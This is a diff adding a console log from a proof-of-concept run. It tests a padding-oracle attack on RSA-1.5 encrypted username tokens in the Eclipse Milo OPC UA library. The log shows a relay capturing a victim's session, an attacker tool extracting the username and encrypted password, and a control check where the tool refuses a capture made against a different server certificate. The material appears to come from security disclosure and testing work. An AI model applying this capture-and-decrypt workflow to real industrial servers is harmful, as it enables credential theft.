@@ -1,0 +1,31 @@
+==> Using /Users/abhinavagarwal/.local/share/mise/installs/java/temurin-17.0.19+10/bin/java (openjdk version "17.0.19" 2026-04-21)
+==> Building against org.eclipse.milo:*:1.1.4 ...
+==> Shaded jar: /Users/abhinavagarwal/Documents/work/milo-security-poc/username-token-padding-oracle/poc/target/padding-oracle-poc.jar
+    milo.version=1.1.4  sha256=8b582350e30a1947d3092aee164e91dd5e91431a9cc34ba67ea0eda7cbe751cb
+==> Working directory: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.x3QB5u
+==> Generated a random victim password at runtime (not printed; not a source constant; length=20)
+==> Certificate-binding control demo: capture a token against server A, then point the
+    attacker at a FRESH server B (different self-signed key) using server A's capture.
+    server A port=29976, cert=97a44e41eaa4e1422dcfa70fdcbb62302cc75963a7ea73a8ac662af00ab83b17
+[main] INFO poc.common.TcpRecordingProxy - Recording relay listening on localhost:59420 -> localhost:29976
+RELAY_LISTENING port=59420
+[main] INFO poc.RelayMain - [relay] listening on localhost:59420 -> localhost:29976 (dumb pipe -- no protocol parsing)
+[main] INFO poc.RelayMain - [relay] recorded 1883 client->server bytes, 3954 server->client bytes (raw, unparsed)
+CAPTURE_WRITTEN c2sFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.x3QB5u/capture-c2s.raw s2cFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.x3QB5u/capture-s2c.raw c2sBytes=1883 s2cBytes=3954
+==> Starting a SECOND, independent server B (fresh self-signed key) ...
+    server B port=25656, cert=672fae744a7679119c2ca2e0e8b6b38972d5646d8f5781b8a657fdb04a441a73
+==> Pointing the attacker at server B using the capture from server A (expect REFUSAL) ...
+[*] Live server certificate SHA-256: 672fae744a7679119c2ca2e0e8b6b38972d5646d8f5781b8a657fdb04a441a73
+[main] INFO poc.AttackerMain - [*] Parsing raw capture ourselves: 1883 client->server bytes from /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T/padding-oracle-poc.x3QB5u/capture-c2s.raw
+[main] INFO poc.common.WireCodec -   decoded ActivateSessionRequest on wire: policyId=username_rsa15, user=victim, encAlg=http://www.w3.org/2001/04/xmlenc#rsa-1_5, password ct = 256 bytes
+[main] INFO poc.AttackerMain - [*] Extracted the server certificate presented during the captured session from the raw server->client bytes ourselves; SHA-256=97a44e41eaa4e1422dcfa70fdcbb62302cc75963a7ea73a8ac662af00ab83b17
+[*] Extracted from capture: username=victim, policyId=username_rsa15
+[main] INFO poc.AttackerMain - [*] Extracted ciphertext SHA-256: 0ecfc54a2425bb444c48288ac81599bcd92481a23a1d222ad85ae266d9976562
+[*] Captured token SHA-256: 0ecfc54a2425bb444c48288ac81599bcd92481a23a1d222ad85ae266d9976562
+[+] Basic128Rsa15 username policy found
+[-] REFUSING: captured token was encrypted to a different server certificate (capture was made against 97a44e41eaa4e1422dcfa70fdcbb62302cc75963a7ea73a8ac662af00ab83b17, live target is 672fae744a7679119c2ca2e0e8b6b38972d5646d8f5781b8a657fdb04a441a73). A token encrypted to a rotated/different key is not a valid target.
+[+] CONTROL PASSED: attacker refused the mismatched capture (exit 3)
+
+==> Environment: Darwin 24.6.0 arm64, openjdk version "17.0.19" 2026-04-21
+==> Run directory retained at: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.x3QB5u
+==> exit 3: refused due to certificate-fingerprint mismatch
